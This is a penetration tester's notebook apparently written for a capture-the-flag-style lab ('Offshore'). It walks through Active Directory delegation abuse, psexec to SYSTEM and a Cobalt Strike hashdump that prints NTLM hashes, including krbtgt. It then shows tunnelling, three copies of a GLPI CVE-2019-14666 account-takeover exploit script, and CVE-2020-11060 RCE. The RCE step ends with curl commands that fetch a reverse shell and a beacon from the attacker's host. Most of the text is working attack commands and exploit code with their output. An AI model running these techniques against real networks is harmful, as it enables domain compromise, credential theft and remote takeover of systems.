Once [[Headed down another path]] & [[No place to hide]] are completed the next path forward is to the domain with `GenericWrite` abuse.

# Windows Abuse Method
`WS03` to `DC02` 's intended path 
![[Pasted image 20240111100600.png]]
![[Pasted image 20240111100817.png]]
![[Pasted image 20240111101003.png]]
```powershell
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```
![[Pasted image 20240111101131.png]]
```powershell
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```
![[Pasted image 20240111101233.png]]
```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```
![[Pasted image 20240111101313.png]]
```powershell
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
![[Pasted image 20240111101539.png]]
We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
```powershell
Rubeus.exe hash /password:Summer2018!
```
![[Pasted image 20240111101700.png]]
```powershell
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
```


# Linux Abuse Method

Resource-Based Constrained Delegation

First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:

```powershell
addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'
```
We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:
```powershell
rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'
```
And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.
```powershell
getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'
```
This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.

###### didnt use this
Shadow Credentials attack
To abuse this privilege, use pyWhisker.
```powershell
pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
```
For other optional parameters, view the pyWhisker documentation.

# My Linux Abuse
- The IP address for the `DC02` was found [[DC01 Domain bloodhound dump]]
step 1:
add a new attacker-controlled computer account can be added with Impact's addcomputer.py example script
- cam said probably dont need -domain-netbios but will need dc-ip option
- ran this command through a `cobaltstrike` socks proxy but is very slow (screenshot below) hang for around 15 minutes
```powershell
proxychains addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'bugserjumper1337!' -dc-host 'DC02@DEV.ADMIN.OFFSHORE.COM' -dc-ip 172.16.2.6 'DEV.ADMIN.OFFSHORE.COM/joe:'
```
![[Pasted image 20240111112440.png]]
Going to transition to a `cisel_64.exe` proxy
utilized this command to upload `chisel_64.exe` - 
```powershell
beacon> upload /opt/chisel/chisel_64.exe (c:\windows\tasks\chisel_64.exe)
```
![[Pasted image 20240111112341.png]]
```powershell
[root💀/opt/cobaltstrike] [10.10.14.39] [2024-01-11 10:42:38] 
 └─╼ # proxychains addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'
```
chisel client setup
![[Pasted image 20240111113238.png]]
chisel server
![[Pasted image 20240111113310.png]]
impacket error command
We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:
![[Pasted image 20240111113345.png]]
the reason it was erroring is because `LDAPS` requires SSL and I dont believe that you are able to do `SSL` over `proxychains`
```powershell
┌──(root💀gobots)-[12Jan2024 16:25:19]-[~/SUT/offshore]
└─# proxychains -q impacket-addcomputer -method SAMR -computer-name 'DEFENSESYSTEM$' -computer-pass 'bugserjumper1337!' -dc-host 'DC02@DEV.ADMIN.OFFSHORE.COM' -dc-ip 172.16.2.6 'DEV.ADMIN.OFFSHORE.COM/joe:'
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Successfully added machine account DEFENSESYSTEM$ with password bugserjumper1337!.

```
![[Pasted image 20240112162710.png]]
edit the `/etc/hosts` config
![[Pasted image 20240112163058.png]]
had to do research to mess with the command to properly get it to work
```powershell
proxychains impacket-rbcd -action write -delegate-to 'dc02$' -delegate-from "DEFENSESYSTEM$" -dc-ip 172.16.2.6 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DEV.ADMIN.OFFSHORE.COM/joe:'
```
![[Pasted image 20240112164535.png]]
And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.
```bash
┌──(root💀gobots)-[12Jan2024 16:48:11]-[~/SUT/offshore]                                                                                                                                                     
└─# proxychains impacket-getST -spn 'cifs/dc02.dev.admin.offshore.com' -impersonate 'administrator' 'dev.admin.offshore.com/DEFENSESYSTEM$:bugserjumper1337!'                                               
[proxychains] config file found: /etc/proxychains4.conf                                                                                                                                                     
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                                                                                                                      
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                                                    
                                                                                                                                                                                                            
[-] CCache file is not found. Skipping...                                                                                                                                                                   
[*] Getting TGT for user                                                                                                                                                                                    
[*] Impersonating administrator                                                                                                                                                                             
[*]     Requesting S4U2self                                                                                                                                                                                 
[*]     Requesting S4U2Proxy                                                                                                                                                                                
[*] Saving ticket in administrator.ccache            
```
![[Pasted image 20240112172607.png]]
exporting the ticket to be utilized for `psexec`, the `TGT` is located in `/root/SUT/offshore`
```powershell
┌──(root💀gobots)-[12Jan2024 16:53:16]-[~/SUT/offshore]
└─# export KRB5CCNAME=administrator.ccache
```
`psexec'ing` 
```
┌──(root💀gobots)-[12Jan2024 16:55:04]-[~/SUT/offshore]
└─# proxychains impacket-psexec dev.admin.offshore.com/administrator@dc02.dev.admin.offshore.com -target-ip 172.16.2.6 -k -no-pass                           
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 172.16.2.6.....
[*] Found writable share ADMIN$
[*] Uploading file kjivwPdj.exe
[*] Opening SVCManager on 172.16.2.6.....
[*] Creating service eYoN on 172.16.2.6.....
[*] Starting service eYoN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

```
![[Pasted image 20240112172714.png]]
```powershell
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::f1f7:68af:28d:f014%8
   IPv4 Address. . . . . . . . . . . : 172.16.2.6
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.2.1
Tunnel adapter Teredo Tunneling Pseudo-Interface:
   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
Tunnel adapter Reusable ISATAP Interface {9EF3C0CC-B1D4-400A-871C-EA0BA165A138}:
   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

```

![[Pasted image 20240112172544.png]]
`OFFSHORE{l@zy_adm1ns_ru1n_th3_p4rty}
`
![[Pasted image 20240112173105.png]]
`restore` and get a beacon, inject to `winlogon` to get a `SYSTEM` beacon
```powershell
[01/18 09:25:34] beacon> hashdump
[01/18 09:25:34] [*] Tasked beacon to dump hashes
[01/18 09:25:34] [+] host called home, sent: 83262 bytes
[01/18 09:25:35] [+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c61f43b6a4db2676714713836b7d2ea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9404def404bc198fd9830a3483869e78:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IIS_dev:1105:aad3b435b51404eeaad3b435b51404ee:ce18f9730484ed029749730e2f82b147:::
joe:1604:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
coco:11601:aad3b435b51404eeaad3b435b51404ee:69baab46628076498356648f42908486:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:1a1d4bd303de23a5ca0e13cda66be2e3:::
WS03$:1104:aad3b435b51404eeaad3b435b51404ee:5cf7b4d94646e8efba50f45b88c12608:::
DEFENSESYSTEM$:11602:aad3b435b51404eeaad3b435b51404ee:35f1c00e54babd1f847a2a827ef4e19b:::
attackersystem$:11603:aad3b435b51404eeaad3b435b51404ee:ef266c6b963c0bb683941032008ad47f:::
Hax0rSystem$:11604:aad3b435b51404eeaad3b435b51404ee:cc687709a0d74dba48f6566f1f155a8a:::
MINE$:11605:aad3b435b51404eeaad3b435b51404ee:cac8b10cadc8048a5c097c4d66677452:::
SMPR$:11606:aad3b435b51404eeaad3b435b51404ee:356358dd1fca46235e5442d37e214c3d:::
ADMIN$:1103:aad3b435b51404eeaad3b435b51404ee:2823744ad586a27915c227494f16a209:::
CORP$:1109:aad3b435b51404eeaad3b435b51404ee:0eea99f7b0a97af8e4cd763103dc851f:::
```
![[Pasted image 20240118102041.png]]
pulled a new `bloodhound` with commands below once on `DC02`, dropped in `c:\windows\tasks`
- bloodhound didnt show anything crazy, `mgmt01` isnt even shown in the domain
```powershell
beacon> execute-assembly /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe -c all --domain DEV.ADMIN.OFFSHORE.COM
[*] Tasked beacon to run .NET program: SharpHound.exe -c all --domain DEV.ADMIN.OFFSHORE.COM
[+] host called home, sent: 1155912 bytes
[+] received output:
2024-01-18T09:36:11.9661614-05:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
```
based off the flag names we know that `mgmt01.dev.admin.offshore` is the next machine so lets ping it 
- windows machine
```powershell
beacon> run ping mgmt01.dev.admin.offshore.com
[*] Tasked beacon to run: ping mgmt01.dev.admin.offshore.com
[+] host called home, sent: 52 bytes
[+] received output:


Pinging mgmt01.dev.admin.offshore.com [172.16.2.12] with 32 bytes of data:
Reply from 172.16.2.12: bytes=32 time<1ms TTL=128
Reply from 172.16.2.12: bytes=32 time<1ms TTL=128
Reply from 172.16.2.12: bytes=32 time<1ms TTL=128
Reply from 172.16.2.12: bytes=32 time<1ms TTL=128

Ping statistics for 172.16.2.12:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```
utilizing `portscan` next
- webserver
```powershell
beacon> portscan 172.16.2.12
[*] Tasked beacon to scan ports 1-1024,3389,5900-6000 on 172.16.2.12
[+] host called home, sent: 95030 bytes
[+] received output:
(ICMP) Target '172.16.2.12' is alive. [read 8 bytes]
172.16.2.12:5985
[+] received output:
172.16.2.12:443
[+] received output:
172.16.2.12:139
172.16.2.12:135
[+] received output:
172.16.2.12:80
[+] received output:
172.16.2.12:445
Scanner module is complete
```
`systeminfo`
```powershell
[01/18 10:24:19] beacon> run systeminfo
[01/18 10:24:19] [*] Tasked beacon to run: systeminfo
[01/18 10:24:19] [+] host called home, sent: 28 bytes
[01/18 10:24:23] [+] received output:

Host Name:                 DC02
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30815-99252-AA331
Original Install Date:     5/31/2018, 11:00:42 PM
System Boot Time:          1/15/2024, 12:36:19 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                        [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21805430.B64.2305221826, 5/22/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,404 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,087 MB
Virtual Memory: In Use:    1,712 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    dev.ADMIN.OFFSHORE.COM
Logon Server:              N/A
Hotfix(s):                 6 Hotfix(s) Installed.
                           [01]: KB4049065
                           [02]: KB4520724
                           [03]: KB4589210
                           [04]: KB5001402
                           [05]: KB5011570
                           [06]: KB5012596
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.2.6
                                 [02]: fe80::f1f7:68af:28d:f014
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
uploaded `chisel`
![[Pasted image 20240118104513.png]]
ensure that `/etc/proxychains4.conf` file is correct
![[Pasted image 20240118113026.png]]
`chisel` server in kali
```powershell
[root💀/opt/chisel] [10.10.14.39] [2024-01-18 10:49:15]                                      
 └─╼ # ./chisel_64 server --socks5 --reverse -p 1000 
```
`chisel` client in beacon
```powershell
beacon> run chisel_64.exe client 10.10.14.39:1000 R:3080:socks
[*] Tasked beacon to run: chisel_64.exe client 10.10.14.39:1000 R:3080:socks
[+] host called home, sent: 68 bytes
[+] received output:
2024/01/18 10:49:49 client: Connecting to ws://10.10.14.39:1000
2024/01/18 10:49:49 client: Connected (Latency 16.7415ms)
```
ensure that `foxyproxy` is setup properly
![[Pasted image 20240118113452.png]]
found `glpi` server and `googled` for default credentials
- `https://forum.glpi-project.org/viewtopic.php?id=23219`
list of credentials to try `normal/normal` worked
```powershell
glpi/glpi (super-admin)  
tech/tech  
postonly/postonly (only for helpdesk)  
normal/normal 
```
![[Pasted image 20240118114306.png]]
on as `normal` user, need to find version to begin RCE
![[Pasted image 20240118114535.png]]`dlpi 9.4.3` is in the screen shot in the bottom right and currently logged in as user `normal/normal`

https://github.com/0xdreadnaught/cve-2020-11060-poc
https://offsec.almond.consulting/playing-with-gzip-rce-in-glpi.html
https://www.exploit-db.com/exploits/49992
https://github.com/zeromirror/cve_2020-11060
https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php

```powershell
[root💀~/SUT/offshore/mgmt01] [10.10.14.39] [2024-01-18 14:58:04] 
└─╼ # proxychains python3 CVE-2020-11060.py --url 'https://172.16.2.12' --user 'normal' --password 'normal' --platform 'win'
```
need to change the `offset` of the script to the correct `offset`, this is found by somehow `sql dumping` for `wifinetworks` offset - havent found a method to do this. Could open up `burpsuite` next. 

says `dc02` isnt allowed to connect to the sql database
![[Pasted image 20240118154011.png]]


```powershell
proxychains python3 CVE-2020-11060.py –url https://172.16.2.12/ -–user normal -–password normal –email glpi_adm@offshore.com -–newpass shell
```

zeromirror


glpi account takeover 
https://www.tarlogic.com/blog/glpi-vulnerability-cve-2019-14666/

# Original CVE-2019-14666
```python
#!/usr/bin/python
#
#  Description: Exploit for CVE-2019-14666 (GLPI <=9.4.3 account takeover)
#  Author: @xassiz (Tarlogic)
#
import re
import sys
import json
import argparse
import requests
class GlpiBrowser:
    def __init__(self, url, user, password):
        self.url = url
        self.user = user
        self.password = password
        
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
    
    
    def extract_csrf(self, html):
        return re.findall('name="_glpi_csrf_token" value="([a-f0-9]{32})"', html)[0]
    
    def get_login_data(self):
        r = self.session.get('{0}'.format(self.url), allow_redirects=True)
        
        csrf_token = self.extract_csrf(r.text)
        name_field = re.findall('name="(.*)" id="login_name"', r.text)[0]
        pass_field = re.findall('name="(.*)" id="login_password"', r.text)[0]
        
        return name_field, pass_field, csrf_token
    
    
    def login(self):
        try:
            name_field, pass_field, csrf_token = self.get_login_data()
        except Exception as e:
            print("[-] Login error: could not retrieve form data")
            sys.exit(1)
        
        data = {
            name_field: self.user, 
            pass_field: self.password,
            "auth": "local",
            "submit": "Post",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/login.php'.format(self.url), data=data, allow_redirects=False)
        
        return r.status_code == 302
    
    
    def get_data(self, , field, term=None):        
        params = {
            "": ,
            "field": field,
            "term": term if term else ""
        }
        
        r = self.session.get('{}/ajax/autocompletion.php'.format(self.url), params=params)
        
        if r.status_code == 200:
            try:
                data = json.loads(r.text)
            except:
                return None
            return data
        return None
        
    
    def get_forget_token(self):
        return self.get_data('User', 'password_forget_token')
        data = self.get_data('User', 'password_forget_token') #chatgpt
        print("[DEBUG] Forget token data:", data) #chatgpt
        return data #chatgpt
    
    
    def get_emails(self):
        return self.get_data('UserEmail', 'email')
    
    
    def lost_password_request(self, email):
        r = self.session.get('{0}/front/lostpassword.php'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print("[-] Lost password error: could not retrieve form data")
            sys.exit(1)
        
        data = {
            "email": email,
            "update": "Save",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/lostpassword.php'.format(self.url), data=data)
        return 'An email has been sent' in r.text
    
    
    def change_password(self, email, password, token):
        r = self.session.get('{0}/front/lostpassword.php'.format(self.url), params={'password_forget_token': token})
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print "[-] Change password error: could not retrieve form data"
            sys.exit(1)
        
        data = {
            "email": email,
            "password": password,
            "password2": password,
            "password_forget_token": token,
            "update": "Save",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/lostpassword.php'.format(self.url), data=data)
        return 'Reset password successful' in r.text
    
    
    def pwn(self, email, password):
        
        if not self.login():
            print("[-] Login error")
            return
        
        tokens = self.get_forget_token()
        if tokens is None:
            tokens = []
        
        if email:
            if not self.lost_password_request(email):
                print("[-] Lost password error: could not request")
                return
            
            new_tokens = self.get_forget_token()
            
            res = list(set(new_tokens) - set(tokens))
            if res:
                for token in res:
                    if self.change_password(email, password, token):
                        print "[+] Password changed! ;)"
                        return
        
        
        
if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="Target URL", required=True)
    parser.add_argument("--user", help="Username", required=True)
    parser.add_argument("--password", help="Password", required=True)
    parser.add_argument("--email", help="Target email")
    parser.add_argument("--newpass", help="New password")
    
    args = parser.parse_args()
    
    g = GlpiBrowser(args.url, user=args.user, password=args.password)
    
    g.pwn(args.email, args.newpass)
```
# Edited CVE-2019-14666

```python
#!/usr/bin/python
#
#  Description: Exploit for CVE-2019-14666 (GLPI <=9.4.3 account takeover)
#  Author: @xassiz (Tarlogic)
#
import re
import sys
import json
import argparse
import requests
class GlpiBrowser:
    def __init__(self, url, user, password):
        self.url = url
        self.user = user
        self.password = password
        
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
    
    
    def extract_csrf(self, html):
        return re.findall('name="_glpi_csrf_token" value="([a-f0-9]{32})"', html)[0]
    
    def get_login_data(self):
        r = self.session.get('{0}'.format(self.url), allow_redirects=True)
        
        csrf_token = self.extract_csrf(r.text)
        name_field = re.findall('name="(.*)" id="login_name"', r.text)[0]
        pass_field = re.findall('name="(.*)" id="login_password"', r.text)[0]
        
        return name_field, pass_field, csrf_token
    
    
    def login(self):
        try:
            name_field, pass_field, csrf_token = self.get_login_data()
        except Exception as e:
            print ("[-] Login error: could not retrieve form data")
            sys.exit(1)
        
        data = {
            name_field: self.user, 
            pass_field: self.password,
            "auth": "local",
            "submit": "Post",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/login.php'.format(self.url), data=data, allow_redirects=False)
        
        return r.status_code == 302
    
    
    def get_data(self, field, term=None):        
        params = {
            "field": field,
            "term": term if term else ""
        }
        
        r = self.session.get('{}/ajax/autocompletion.php'.format(self.url), params=params)
        
        if r.status_code == 200:
            try:
                data = json.loads(r.text)
            except:
                return None
            return data
        return None
        
    
    def get_forget_token(self):
        return self.get_data('User', 'password_forget_token')
    
    
    def get_emails(self):
        return self.get_data('UserEmail', 'email')
    
    
    def lost_password_request(self, email):
        r = self.session.get('{0}/front/lostpassword.php'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print ("[-] Lost password error: could not retrieve form data")
            sys.exit(1)
        
        data = {
            "email": email,
            "update": "Save",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/lostpassword.php'.format(self.url), data=data)
        return 'An email has been sent' in r.text
    
    
    def change_password(self, email, password, token):
        r = self.session.get('{0}/front/lostpassword.php'.format(self.url), params={'password_forget_token': token})
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print ("[-] Change password error: could not retrieve form data")
            sys.exit(1)
        
        data = {
            "email": email,
            "password": password,
            "password2": password,
            "password_forget_token": token,
            "update": "Save",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/lostpassword.php'.format(self.url), data=data)
        return 'Reset password successful' in r.text
    
    
    def pwn(self, email, password):
        
        if not self.login():
            print ("[-] Login error")
            return
        
        tokens = self.get_forget_token()
        if tokens is None:
            tokens = []
        
        if email:
            if not self.lost_password_request(email):
                print ("[-] Lost password error: could not request")
                return
            
            new_tokens = self.get_forget_token()
			print("New Tokens:", new_tokens)#chatgpt edit

            if new_tokens is not None:  #chatgpt recommendation
	            res = list(set(new_tokens) - set(tokens))
	            if res:
	                for token in res:
	                    if self.change_password(email, password, token):
	                        print ("[+] Password changed! ;)")
	                        return
            else:
                print("[-] Error getting new tokens") # chatgpt recommendation
        
        
if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="Target URL", required=True)
    parser.add_argument("--user", help="Username", required=True)
    parser.add_argument("--password", help="Password", required=True)
    parser.add_argument("--email", help="Target email")
    parser.add_argument("--newpass", help="New password")
    
    args = parser.parse_args()
    
    g = GlpiBrowser(args.url, user=args.user, password=args.password)
    
    g.pwn(args.email, args.newpass)
```

# chat gpt rewrite
```python
#!/usr/bin/python
#
#  Description: Exploit for CVE-2019-14666 (GLPI <=9.4.3 account takeover)
#  Author: @xassiz (Tarlogic)
#
import re
import sys
import json
import argparse
import requests


class GlpiBrowser:
    def __init__(self, url, user, password):
        self.url = url
        self.user = user
        self.password = password

        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()

    def extract_csrf(self, html):
        return re.findall('name="_glpi_csrf_token" value="([a-f0-9]{32})"', html)[0]

    def get_login_data(self):
        r = self.session.get('{0}'.format(self.url), allow_redirects=True)

        csrf_token = self.extract_csrf(r.text)
        name_field = re.findall('name="(.*)" id="login_name"', r.text)[0]
        pass_field = re.findall('name="(.*)" id="login_password"', r.text)[0]

        return name_field, pass_field, csrf_token

    def login(self):
        try:
            name_field, pass_field, csrf_token = self.get_login_data()
        except Exception as e:
            print("[-] Login error: could not retrieve form data")
            sys.exit(1)

        data = {
            name_field: self.user,
            pass_field: self.password,
            "auth": "local",
            "submit": "Post",
            "_glpi_csrf_token": csrf_token
        }

        r = self.session.post('{}/front/login.php'.format(self.url), data=data, allow_redirects=False)

        return r.status_code == 302

    def get_data(self, field, term=None):
        params = {
            "field": field,
            "term": term if term else ""
        }

        r = self.session.get('{}/ajax/autocompletion.php'.format(self.url), params=params)

        if r.status_code == 200:
            try:
                data = json.loads(r.text)
            except:
                return None
            return data
        return None

    def get_forget_token(self):
        return self.get_data('User', 'password_forget_token')

    def get_emails(self):
        return self.get_data('UserEmail', 'email')

    def lost_password_request(self, email):
        r = self.session.get('{0}/front/lostpassword.php'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print("[-] Lost password error: could not retrieve form data")
            sys.exit(1)

        data = {
            "email": email,
            "update": "Save",
            "_glpi_csrf_token": csrf_token
        }

        r = self.session.post('{}/front/lostpassword.php'.format(self.url), data=data)
        return 'An email has been sent' in r.text

    def change_password(self, email, password, token):
        r = self.session.get('{0}/front/lostpassword.php'.format(self.url), params={'password_forget_token': token})
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print("[-] Change password error: could not retrieve form data")
            sys.exit(1)

        data = {
            "email": email,
            "password": password,
            "password2": password,
            "password_forget_token": token,
            "update": "Save",
            "_glpi_csrf_token": csrf_token
        }

        r = self.session.post('{}/front/lostpassword.php'.format(self.url), data=data)
        return 'Reset password successful' in r.text

    def pwn(self, email, password):
        if not self.login():
            print("[-] Login error")
            return

        tokens = self.get_forget_token()
        if tokens is None:
            tokens = []

        if email:
            if not self.lost_password_request(email):
                print("[-] Lost password error: could not request")
                return

            new_tokens = self.get_forget_token()

            if new_tokens is not None:  # chatgpt recommendation
                print("New Tokens:", new_tokens)  # chatgpt edit
                res = list(set(new_tokens) - set(tokens))
                if res:
                    print("Res Tokens:", res)  # Add this line for debugging
                    for token in res:
                        try:
                            if self.change_password(email, password, token):
                                print("[+] Password changed! ;)")
                                return
                        except Exception as e:
                            print(f"[-] Change password error: {e}")
            else:
                print("[-] Error getting new tokens")  # chatgpt recommendation


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="Target URL", required=True)
    parser.add_argument("--user", help="Username", required=True)
    parser.add_argument("--password", help="Password")

```


# this script worked and changed the password.
https://github.com/SamSepiolProxy/GLPI-9.4.3-Account-Takeover/blob/main/reset.py

```powershell
[root💀~/SUT/offshore/mgmt01] [10.10.14.39] [2024-01-20 22:32:29] 
 └─╼ # proxychains python3 reset.py --url http://172.16.2.12/ --user normal --password normal --email glpi_adm@offshore.com --newpass passwords
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[+] Password changed! ;
```
when you go to login take off the `@offshore.com` portion and only utilize the `glpi_adm` `passwords`

in order to grab the `offset` utilized this script https://www.exploit-db.com/exploits/49992 to get the directions to download the `sql` backup from screenshot below when logged in as `glpi_adm`
![[Pasted image 20240120225621.png]]
unzip the file and use command below to get the offset which is `313`
```powershell
[root💀~/SUT/offshore/mgmt01] [10.10.14.39] [2024-01-20 22:53:32] 
 └─╼ # cat glpi-backup-9.4.3-2024-01-21-04-51.sql | grep "CREATE TABLE" | grep -n wifinetworks                                                                                                              
313:CREATE TABLE `glpi_wifinetworks` (

```

utilized this script `https://github.com/0xdreadnaught/cve-2020-11060-poc` to get `RCE`.

The 1st attempt that I ran it showed that it failed due to the chosen offset which was `313` according to my command above
![[Pasted image 20240120231132.png]]
i switched it to `312` the default and was able to get RCE
- typically takes around 3 times to actually work
```powershell
[root💀~/SUT/offshore/mgmt01] [10.10.14.39] [2024-01-20 23:07:58] 
 └─╼ # proxychains python3 CVE-2020-11060.py --url 'http://172.16.2.12/' --user 'glpi_adm' --password 'passwords' --platform 'win' --offset 312
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[+] GLPI Browser targeting 'http://172.16.2.12/' ('windows') with following credentials: 'glpi_adm':'passwords'.
[+] Target is up and responding.
[+] User 'glpi_adm' is logged in.
------------------------- trial number 1 -------------------------
[*] Wiping networks...
[+] Network created
[+] Modifying network
        New ESSID: RCEe
[+] Current shellname: mavEnVji.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\mavEnVji.php
[+] File 'dumped', accessible at: http://172.16.2.12//sound/mavEnVji.php
[+] Shell size: 8365
------------------------------------------------------------------
[+] RCE found after 1 trials!
[+] You can execute command remotely as: nt authority\network service@MGMT01
[+] Run this tool again with the desired command to inject:
        python3 CVE-2020-11060.py --url 'http://172.16.2.12//sound/mavEnVji.php' --command 'desired_command_here'

```

![[Pasted image 20240120231242.png]]

found potential passwords
![[Pasted image 20240120231550.png]]
able to `ping` my own machine so should be able to pull files over as well
![[Pasted image 20240120233019.png]]

# This is normal flag
found in `c:\users\public\`
![[Pasted image 20240120235709.png]]
utilized curl to transfer file
![[Pasted image 20240121000953.png]]```
```powershell
[root💀~/SUT/offshore/mgmt01] [10.10.14.39] [2024-01-21 00:09:27] 
 └─╼ # proxychains python3 CVE-2020-11060.py --url 'http://172.16.2.12//sound/mavEnVji.php' --command 'curl -O http://10.10.14.39:8000/php-revshell.php'
```


was able to get a cobaltstrike beacon with this
![[Pasted image 20240121003822.png]]
`curl -O` outputs the file on the `SOUND` directory
```powershell
[root💀~/SUT/offshore/mgmt01] [10.10.14.39] [2024-01-21 00:14:32] 
 └─╼ # proxychains python3 CVE-2020-11060.py --url 'http://172.16.2.12//sound/mavEnVji.php' --command 'curl -O http://10.10.14.39:8000/http_x64.exe'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[*] Response received from 'http://172.16.2.12//sound/mavEnVji.php':
```
![[Pasted image 20240121003940.png]]
then to execute utilize the `RCE`
```powershell
[root💀~/SUT/offshore/mgmt01] [10.10.14.39] [2024-01-21 00:15:33] 
